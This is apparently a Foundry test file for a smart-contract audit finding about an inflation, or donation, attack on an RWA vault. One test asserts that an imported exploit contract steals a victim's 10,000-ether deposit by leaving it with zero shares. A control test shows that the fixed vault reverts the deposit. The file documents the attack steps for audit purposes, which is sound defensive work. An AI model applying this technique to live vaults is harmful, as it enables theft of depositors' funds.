// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Token, VaultAdapter, RwaVaultFixed, Depositor, ZeroShares} from
    "./66180-h-18-inflation-attack-in-rwa-vault-pashov-audit-group-none-r.sol";

contract Finding66180Test is Test {
    function test_exploit_donation_zeros_victim_shares() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.stolen(), 10_000 ether, "victim deposit stolen");
        assertEq(e.victimShares(), 0, "victim minted zero shares");
        assertEq(e.asset().balanceOf(address(e)), 1_000_000 ether + 1 + 10_000 ether, "attacker holds everything");
        assertEq(e.asset().balanceOf(address(e.victim())), 0, "victim empty");
        assertEq(e.asset().balanceOf(address(e.adapter())), 0, "adapter empty");
        assertEq(e.vault().vaultToken().totalSupply(), 0, "share supply burned");
    }

    function test_control_zero_share_deposit_reverts_and_victim_keeps_assets() public {
        Token asset = new Token();
        VaultAdapter adapter = new VaultAdapter(asset);
        RwaVaultFixed vault = new RwaVaultFixed(asset, adapter);
        adapter.setVault(address(vault));
        Depositor victim = new Depositor(asset);

        asset.mint(address(this), 1_000_000 ether + 1);
        asset.mint(address(victim), 10_000 ether);

        asset.approve(address(adapter), 1);
        assertEq(vault.deposit(abi.encode(uint256(1))), 1, "first share");
        assertTrue(asset.transfer(address(adapter), 1_000_000 ether), "donate");

        vm.expectRevert(ZeroShares.selector);
        victim.depositInto(vault, 10_000 ether);

        assertEq(asset.balanceOf(address(victim)), 10_000 ether, "victim kept 10000");
        assertEq(vault.vaultToken().balanceOf(address(victim)), 0, "no victim shares");
        uint256 out = vault.withdraw(1);
        assertEq(out, 1_000_000 ether + 1, "attacker recovers only their own assets");
        assertEq(asset.balanceOf(address(this)), 1_000_000 ether + 1, "no profit");
        assertEq(asset.balanceOf(address(victim)), 10_000 ether, "victim untouched");
    }
}
